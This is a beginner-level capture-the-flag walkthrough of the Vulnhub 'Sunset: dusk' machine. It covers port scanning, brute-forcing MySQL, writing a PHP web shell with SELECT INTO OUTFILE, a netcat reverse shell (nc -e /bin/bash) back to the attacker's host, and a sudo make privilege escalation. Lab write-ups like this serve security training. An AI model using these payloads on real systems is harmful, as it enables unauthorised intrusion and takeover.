# Sunset:dusk ~Vulnhub Walkthrough
Sunset: dusk is another CTF challenge given by vulnhub and the level difficulty is set according to beginners and credit goes to whitecr0wz.



## Scanning

nmap -p- target ip (full port scan)

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled.png)

nmap -sV -A 192.168.122.150 (Service version scanning)

```jsx
root@kali:~# nmap -sV -A 192.168.122.150
Starting Nmap 7.80SVN ( https://nmap.org ) at 2020-08-10 13:10 EDT
Nmap scan report for 192.168.122.155
Host is up (0.00094s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     pyftpdlib 1.5.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.122.155:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 b5:ff:69:2a:03:fd:6d:04:ed:2a:06:aa:bf:b2:6a:7c (RSA)
|   256 0b:6f:20:d6:7c:6c:84:be:d8:40:61:69:a2:c6:e8:8a (ECDSA)
|_  256 85:ff:47:d9:92:50:cb:f7:44:6c:b4:f4:5c:e9:1c:ed (ED25519)
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: dusk.dusk, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
| ssl-cert: Subject: commonName=dusk.dusk
| Subject Alternative Name: DNS:dusk.dusk
| Not valid before: 2019-11-27T21:09:14
|_Not valid after:  2029-11-24T21:09:14
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
3306/tcp open  mysql   MySQL 5.5.5-10.3.18-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.18-MariaDB-0+deb10u1
|   Thread ID: 38
|   Capabilities flags: 63486
|   Some Capabilities: SupportsTransactions, SupportsLoadDataLocal, FoundRows, Support41Auth, Speaks41ProtocolOld, ConnectWithDatabase, Speaks41ProtocolNew, ODBCClient, InteractiveClient, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, SupportsCompression, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: j!]4,{MN|I8xwk5ct<o9
|_  Auth Plugin Name: mysql_native_password
8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.11-1)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 00:0C:29:3D:E7:3F (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host:  dusk.dusk; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.94 ms 192.168.122.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.57 seconds
root@kali:~#
```

## Enumeration

Open ip in browser

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%201.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%201.png)

[http://192.168.122.150:8080](http://192.168.122.150:8080) 

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%202.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%202.png)

Trying to login through ssh, ftp and smtp port.

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%203.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%203.png)

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%204.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%204.png)

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%205.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%205.png)

Using hydra to bruteforce password of mysql 

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%206.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%206.png)

Found password **password**

**mysql -h 192.168.122.150 -u root -p**

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%207.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%207.png)

## Exploitation

Injecting RCE payload 

select "<?php echo system($_GET['cmd']); ?" into outfile "/var/tmp/backdoor.php";

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%208.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%208.png)

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%209.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%209.png)

### Reverse shell

[http://192.168.122.150:8080/backdoor.php?cmd=](http://192.168.122.150:8080/backdoor.php?cmd=)nc -e /bin/bash 192.168.122.148 1234

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%2010.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%2010.png)

Side by side start nc listener on 1234 port

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%2011.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%2011.png)

***Got shell of www-data

cd /home 

cd /dusk 

ls -al

cat user.txt

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%2012.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%2012.png)

sudo -l 

user www-data can run /usr/bin/make with privilege of dusk

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%2013.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%2013.png)

### Privilege escalation (dusk)

COMMAND='/bin/sh' 

sudo -u dusk make -s --eval=$'x:\n\t-'"$COMMAND"

id

![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%2014.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%2014.png)

***Got shell of dusk user
